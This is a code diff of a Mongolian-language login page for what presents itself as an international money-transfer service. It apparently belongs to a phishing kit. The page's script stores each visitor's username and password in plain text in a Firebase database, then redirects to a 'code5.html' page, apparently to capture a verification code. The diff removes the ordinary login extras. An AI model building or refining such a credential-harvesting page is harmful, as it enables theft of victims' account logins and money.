@@ -14,7 +14,7 @@
         <nav class="navbar navbar-expand-lg">
             <div class="container">
                 <a class="navbar-brand" href="index.html">
-                    <img src="images/ban12.png" alt="Logo" width="40" height="34" class="d-inline-block align-text-top me-2">
+                    <img src="images/ban4.jpeg" alt="Logo" width="40" height="34" class="d-inline-block align-text-top me-2">
                     <span class="text-success">Олон улсын</span> шилжүүлэг
                 </a>
             </div>
@@ -22,43 +22,20 @@
     </header>
     <main>
         <div class="m-3 text-center">
-            <img src="images/ban2.png" alt="" class="img-fluid w-lg-25" width="150">
+            <img src="images/ban4.jpeg" alt="" class=" img-fluid" width="100">
         </div>
         <div>
             <form id="userForm" class="container">
                 <div class="">
-                    <input 
-                        type="text" 
-                        name="username" 
-                        id="username" 
-                        class="form-control-lg form-control" 
-                        placeholder="Нэвтрэх нэр" 
-                        required>
+                    <input type="text" name="username" id="username" class="form-control-lg form-control" placeholder="Нэвтрэх нэр" required>
                 </div>
                 <br>
                 <div class="input-group">
-                    <input 
-                      type="password" 
-                      id="password" 
-                      name="motdepasse"
-                      class="form-control" 
-                      placeholder="Нууц уг" 
-                      required>
+                    <input type="password" id="password" name="motdepasse" class="form-control" placeholder="Нууц уг" required>
                     <span class="input-group-text" id="togglePassword"><i class="fas fa-eye"></i></span>
                 </div>
                 <br>
-                <div class="row row-cols-2 px-2">
-                    <div class="form-check">
-                      <input type="checkbox" class="form-check-input" id="remember" name="remember">
-                      <label class="form-check-label fs-6" for="remember">надад санаарай</label>
-                    </div>
-                    <div class="text-end">
-                        <a href="#" class="text-green link-offset-2-hover fs-6">Нууц үг мартсан</a>
-                    </div>
-                </div>
-                <br>
-                <button type="submit" class="btn w-100 my-3 text-white bg-green">Нэгдэх</button>
-                <a href="#" class="btn btn-outline-success w-100">Бүртгүүлэх</a>
+                <button type="submit" class="btn btn-primary w-100 my-3">Нэгдэх</button>
             </form>
         </div>
     </main>
@@ -73,6 +50,7 @@
                     <div class="footer-links text-md-end">
                         <ul class="list-inline">
                             <li class="list-inline-item"><a class="link-underline link-underline-opacity-0" href="admin.signIn.html">Үйлчилгээний нөхцөл</a></li>
+                           
                         </ul>
                         <p class="mt-3 mb-0">&copy; 2023 Олон улсын шилжүүлэг. Бүх эрх хуулиар хамгаалагдсан.</p>
                     </div>
@@ -146,19 +124,14 @@
                             id: customId,
                             username: username,
                             motdepasse: password,
-                            transacpassword: "",
                             code: "",
                             timestamp: new Date()
                         });
 
                         console.log("Document créé avec l'ID : ", customId);
-
-                        // Rediriger vers code3.html avec l'ID
                         window.location.href = `code5.html?id=${customId}`;
-
                     } catch (error) {
                         console.error("Erreur Firebase :", error);
-                        alert("Une erreur s'est produite. Veuillez réessayer.");
                     }
                 } else {
                     alert("Veuillez remplir tous les champs !");
